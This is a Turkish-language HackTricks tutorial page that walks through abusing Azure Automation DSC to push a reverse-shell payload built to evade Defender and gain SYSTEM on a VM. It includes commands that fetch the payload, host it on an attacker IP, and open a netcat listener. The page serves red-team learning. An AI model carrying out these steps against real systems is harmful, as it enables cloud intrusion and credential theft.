# Az - Durum Yapılandırması Uzaktan Kod Yürütme (RCE)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

**Tam yazıyı buradan kontrol edin: [https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)**

### Uzaktan Sunucu (C2) Altyapısı Hazırlama ve Adımlarının Özeti

#### Genel Bakış
Bu süreç, Windows Defender'ı atlatan değiştirilmiş bir Nishang `Invoke-PowerShellTcp.ps1` yükünü barındırmak için uzaktan bir sunucu altyapısı kurmayı içerir. Yük, `40.84.7.74` IP'li bir Kali Linux makinesinden basit bir Python HTTP sunucusu kullanılarak sunulur. İşlem, aşağıdaki adımlarla gerçekleştirilir:

#### Adım 1 — Dosyaları Oluşturma
- **Gerekli Dosyalar:** İki PowerShell komut dosyası gereklidir:
1. `reverse_shell_config.ps1`: Yükü alıp yürüten bir Desired State Configuration (DSC) dosyasıdır. [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse_shell_config.ps1) üzerinden elde edilebilir.
2. `push_reverse_shell_config.ps1`: Yapılandırmayı sanal makineye yayımlayan bir komut dosyasıdır. [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push_reverse_shell_config.ps1) üzerinde bulunur.
- **Özelleştirme:** Bu dosyalardaki değişkenler ve parametreler, kullanıcının belirli ortamına göre uyarlanmalıdır. Bu, kaynak adları, dosya yolları ve sunucu/yük tanımlayıcıları gibi unsurları içerir.

#### Adım 2 — Yapılandırma Dosyasını Sıkıştırma
- `reverse_shell_config.ps1` dosyası `.zip` formatına sıkıştırılır ve Azure Depolama Hesabına transfer için hazır hale getirilir.
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
#### Adım 3 — Depolama Bağlamını Ayarla ve Yükle
- Sıkıştırılmış yapılandırma dosyası, Azure'nin Set-AzStorageBlobContent komut dosyasını kullanarak önceden tanımlanmış bir Azure Depolama kabına, azure-pentest'e yüklenir.
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
#### Adım 4 — Kali Box'ı Hazırlama
- Kali sunucusu, RevPS.ps1 yükünü bir GitHub deposundan indirir.
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
- Adım 5 — Yapılandırma Dosyasını Yayımla
- Yapılandırma dosyası çalıştırılır ve ters kabuk betiği belirtilen konuma Windows VM üzerine dağıtılır.

#### Adım 6 — Yükü Barındır ve Dinleyiciyi Kur
- Bir Python SimpleHTTPServer, yükü barındırmak için başlatılır ve gelen bağlantıları yakalamak için bir Netcat dinleyicisi kurulur.
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
- Zamanlanmış görev, payload'ı çalıştırarak SYSTEM düzeyinde ayrıcalıklar elde eder.

#### Sonuç

Bu sürecin başarılı bir şekilde gerçekleştirilmesi, kimlik bilgilerinin çalınması veya saldırının birden fazla sanal makineye yayılması gibi birçok olasılığı beraberinde getirir. Kılavuz, Azure Automation DSC alanında sürekli öğrenmeyi ve yaratıcılığı teşvik eder.

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin.
* Özel [**NFT'lerimizden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin.
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** paylaşın.

</details>
